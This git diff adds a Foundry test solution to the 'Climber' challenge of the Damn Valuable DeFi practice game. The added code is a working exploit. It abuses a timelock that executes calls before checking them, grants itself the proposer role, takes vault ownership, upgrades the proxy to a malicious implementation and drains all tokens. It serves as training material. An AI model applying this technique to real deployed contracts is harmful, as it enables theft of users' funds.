@@ -9,6 +9,38 @@ import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
 import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
 
+contract ClimberVaultExploit is ClimberVault {
+    constructor() initializer {}
+
+    function exploit(address _tokenAddress, address _attacker) external {
+        DamnValuableToken token = DamnValuableToken(_tokenAddress);
+        require(token.transfer(_attacker, token.balanceOf(address(this))), "Transfer failed");
+    }
+}
+
+contract ClimberTimelockExploit {
+    function schedule(address _attacker, address _vault, address _timelock, bytes32 _salt) external {
+        ClimberTimelock vaultTimeLock = ClimberTimelock(payable(_timelock));
+        address[] memory targets = new address[](3);
+        uint256[] memory values = new uint[](3);
+        bytes[] memory datas = new bytes[](3);
+        // set attacker as owner
+        targets[0] = address(_vault);
+        values[0] = 0;
+        datas[0] = abi.encodeWithSignature("transferOwnership(address)", _attacker);
+        // set this contract as proposer
+        targets[1] = address(_timelock);
+        values[1] = 0;
+        datas[1] = abi.encodeWithSignature("grantRole(bytes32,address)", vaultTimeLock.PROPOSER_ROLE(), address(this));
+        // create the proposal
+        targets[2] = address(this);
+        values[2] = 0;
+        datas[2] =
+            abi.encodeWithSignature("schedule(address,address,address,bytes32)", _attacker, _vault, _timelock, _salt);
+        vaultTimeLock.schedule(targets, values, datas, _salt);
+    }
+}
+
 contract Climber is Test {
     uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;
 
@@ -72,6 +104,43 @@ contract Climber is Test {
         /**
          * EXPLOIT START *
          */
+        ClimberTimelockExploit climberTimelockExploit = new ClimberTimelockExploit();
+
+        bytes32 salt = keccak256(abi.encodePacked("salt"));
+        address[] memory targets = new address[](3);
+        uint256[] memory values = new uint[](3);
+        bytes[] memory datas = new bytes[](3);
+
+        // set attacker as owner
+        targets[0] = address(climberVaultProxy);
+        values[0] = 0;
+        datas[0] = abi.encodeWithSignature("transferOwnership(address)", attacker);
+        // set this contract as proposer
+        targets[1] = address(climberTimelock);
+        values[1] = 0;
+        datas[1] = abi.encodeWithSignature(
+            "grantRole(bytes32,address)", climberTimelock.PROPOSER_ROLE(), address(climberTimelockExploit)
+        );
+        // create the proposal
+        targets[2] = address(climberTimelockExploit);
+        values[2] = 0;
+        datas[2] = abi.encodeWithSignature(
+            "schedule(address,address,address,bytes32)",
+            attacker,
+            address(climberVaultProxy),
+            address(climberTimelock),
+            salt
+        );
+
+        vm.startPrank(attacker);
+
+        climberTimelock.execute(targets, values, datas, salt);
+
+        ClimberVaultExploit climberVaultExploit = new ClimberVaultExploit();
+
+        ClimberVault(address(climberVaultProxy)).upgradeTo(address(climberVaultExploit));
+        ClimberVaultExploit(address(climberVaultProxy)).exploit(address(dvt), attacker);
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
